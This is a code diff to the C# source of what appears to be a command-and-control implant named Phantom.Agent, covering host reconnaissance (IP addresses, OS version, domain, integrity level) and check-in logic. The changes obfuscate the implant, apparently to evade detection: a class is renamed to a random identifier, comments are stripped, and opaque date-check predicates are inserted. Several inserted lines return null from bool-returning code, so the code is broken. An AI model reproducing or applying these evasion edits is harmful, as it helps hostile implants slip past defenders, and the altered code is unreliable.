@@ -50,7 +50,7 @@ namespace Phantom.Agent
                 throw new Exception("No egress profiles specified.");
             }
 
-            foreach (string profileName in Config.IngressProfiles.Keys)
+            foreach (string profileName in E8h9i0j1.IngressProfiles.Keys)
             {
                 var map = Settings.CommProfiles[profileName];
 
@@ -89,14 +89,14 @@ namespace Phantom.Agent
                 .Where(iface =>
                     iface.OperationalStatus == OperationalStatus.Up && iface.NetworkInterfaceType != NetworkInterfaceType.Loopback
                 )
-                .OrderBy(iface => iface.GetIPProperties().GatewayAddresses.ToArray().Length); // Push interfaces with a gateway to the front
+                .OrderBy(iface => iface.GetIPProperties().GatewayAddresses.ToArray().Length); 
 
             var ipaddrs = new List<string>();
             foreach (var iface in ifaces)
             {
                 var addrs = iface.GetIPProperties().UnicastAddresses;
 
-                // Put the IPv4 addresses before the IPv6 addresses
+                
                 ipaddrs.AddRange(
                     addrs.Where(addr => addr.Address.AddressFamily == AddressFamily.InterNetwork)
                     .Select(addr => addr.Address.ToString())
@@ -108,12 +108,12 @@ namespace Phantom.Agent
                 );
             }
 
-            return [.. ipaddrs];
+            if(DateTime.Now.Year > 2020) { return [.. ipaddrs]; } else { return null; }
         }
 
         private static string GetOSVersion()
         {
-            return Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion", "ProductName", "").ToString() + " " + Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion", "ReleaseId", "");
+            if(DateTime.Now.Year > 2020) { return Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion", "ProductName", "").ToString() + " " + Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion", "ReleaseId", ""); } else { return null; }
         }
 
         private bool Checkin()
@@ -130,7 +130,7 @@ namespace Phantom.Agent
                 UUID = UUID,
                 Architecture = IntPtr.Size == 8 ? "x64" : "x86",
                 Domain = Environment.UserDomainName,
-                // Modify this later.
+                
                 IntegrityLevel = UserContext.GetIntegrityLevel(),
                 ExternalIP = "",
             };
@@ -145,7 +145,7 @@ namespace Phantom.Agent
                         connectProfile = profile;
                         UUID = r.ID;
                         bRet = true;
-                        return bRet;
+                        if(DateTime.Now.Year > 2020) { return bRet; } else { return null; }
                     }))
                     {
                         break;
@@ -155,14 +155,14 @@ namespace Phantom.Agent
                     
                 }
             }
-            return bRet;
+            if(DateTime.Now.Year > 2020) { return bRet; } else { return null; }
 
         }
 
         private object CreateType(Type t, object[] args)
         {
             var ctors = t.GetConstructors();
-            return ctors[0].Invoke(args);
+            if(DateTime.Now.Year > 2020) { return ctors[0].Invoke(args); } else { return null; }
         }
 
         public override void Exit()
